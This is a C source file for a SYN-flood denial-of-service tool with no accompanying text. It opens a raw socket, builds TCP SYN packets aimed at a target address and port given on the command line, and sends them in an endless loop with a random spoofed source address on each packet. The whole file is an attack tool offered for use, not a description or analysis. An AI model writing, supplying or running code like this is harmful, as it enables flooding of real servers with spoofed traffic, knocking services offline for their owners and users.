#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <linux/tcp.h>
#include <netinet/ip.h>
unsigned short check_sum(unsigned short *addr,int len)
{
	register int nleft=len;
	register int sum=0;
	register short *w=addr;
	unsigned short answer=0;
	while(nleft>1)
	{
		sum+=*w++;
		nleft-=2;
	}
	if(nleft==1)
	{
		*(unsigned char*)(&answer)=*(unsigned char*)w;
		sum+=answer;
	}
	sum=(sum>>16)+(sum&0xffff);
	sum+=(sum>>16);
	answer=~sum;
	return answer;
}

void attack_action(int attack_sck,struct sockaddr_in* attack_addr,unsigned short attack_port)
{
	char buf[128]={0};
	struct tcphdr * tcp_hdr;
	struct ip *ip_hdr;
	int ip_len;

	ip_len=sizeof(struct ip)+sizeof(struct tcphdr);
	ip_hdr=(struct ip*)buf;  

    ip_hdr->ip_hl=sizeof(struct ip)>>2;
	ip_hdr->ip_v=IPVERSION;
	ip_hdr->ip_tos=0;
	ip_hdr->ip_len=htons(ip_len);
	ip_hdr->ip_id=0;
	ip_hdr->ip_off=0;
	ip_hdr->ip_ttl=MAXTTL;
	ip_hdr->ip_p=IPPROTO_TCP;
	ip_hdr->ip_sum=0;
	ip_hdr->ip_dst=attack_addr->sin_addr;

    tcp_hdr=(struct tcphdr*)(buf+sizeof(struct ip));
    tcp_hdr->source=htons(attack_port);
    tcp_hdr->dest=attack_addr->sin_port;
    tcp_hdr->seq=random();
    tcp_hdr->doff=5;
    tcp_hdr->syn=1;
    tcp_hdr->check=0;
    while(1)
    {
    	ip_hdr->ip_src.s_addr=random();
    	tcp_hdr->check=check_sum((unsigned short*)tcp_hdr,sizeof(struct tcphdr));
    	sendto(attack_sck,buf,ip_len,0,(struct sockaddr*)attack_addr,sizeof(struct sockaddr_in));
    }   
}

int main(int argc, char const *argv[])
{
	int attack_sck;
	struct sockaddr_in dest_addr;
	struct hostent * host;
	const int is_on=1;
	unsigned short source_port;
	if(argc!=4)
	{
		printf("parameter error\n");
		exit(-1);
	}
	bzero(&dest_addr,sizeof(dest_addr));
	dest_addr.sin_family=AF_INET;	
	dest_addr.sin_port=htons(atoi(argv[2]));
	inet_aton(argv[1],&dest_addr.sin_addr);
	attack_sck=socket(PF_INET,SOCK_RAW,IPPROTO_TCP);
	if(attack_sck<0)
	{
		perror("socket:");
		exit(-1);
	}
	setsockopt(attack_sck,IPPROTO_IP,IP_HDRINCL,&is_on,sizeof(is_on));
	//setuid(getpid());
	source_port=atoi(argv[3]);
	attack_action(attack_sck,&dest_addr,source_port);
	return 0;
}